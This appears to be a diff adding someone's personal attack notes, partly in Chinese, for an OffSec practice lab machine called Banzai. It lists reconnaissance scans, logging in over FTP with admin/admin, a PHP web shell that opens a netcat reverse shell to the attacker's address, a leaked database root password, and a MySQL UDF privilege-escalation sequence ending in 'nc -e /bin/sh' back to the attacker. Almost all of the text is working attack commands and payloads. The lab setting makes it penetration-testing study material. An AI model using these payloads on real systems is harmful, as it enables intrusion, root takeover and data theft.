@@ -1,0 +1,39 @@
+nmap 192.168.69.56 -sV -sC -Pn > nmap1.txt
+nmap 192.168.69.56 -p- > nmapall.txt
+nmap 192.168.69.56 -p- -sV -sC -Pn -T5 > nmapallPn.txt
+gobuster dir  -u http://banzai.offseclabs.com/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+gobuster dir  -u http://banzai.offseclabs.com:8295/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster8295.txt
+enum4linux 192.168.69.56
+
+psql -h 192.168.69.56 -U postsgres -p 5432
+
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.69 4444 >/tmp/f"); ?>
+
+
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'EscalateRaftHubris123');
+define('DBNAME', 'main');
+?>
+
+
+
+psql  -U postsgres -p 5432
+
+
+
+1.nmap掃描出21 80 port
+2. ftp 使用admin,admin密碼可以登入
+3.上傳webshell後可以訪問下地址執行
+http://banzai.offseclabs.com:8295/webshell.php
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.69 22 >/tmp/f
+4.mysql有提權漏洞,下載lib_mysqludf_sys_64.so
+https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
+5.一定要使用ftp上傳並在ftp中chmod 777 給予所有權限
+6.以下指令將新建一個sys_exec方法,且是root運行權限
+mysql> create table trenchesofit(line blob);
+mysql> insert into trenchesofit values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
+mysql> select * from trenchesofit into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+mysql> select sys_exec('nc -e /bin/sh 192.168.49.130 22');
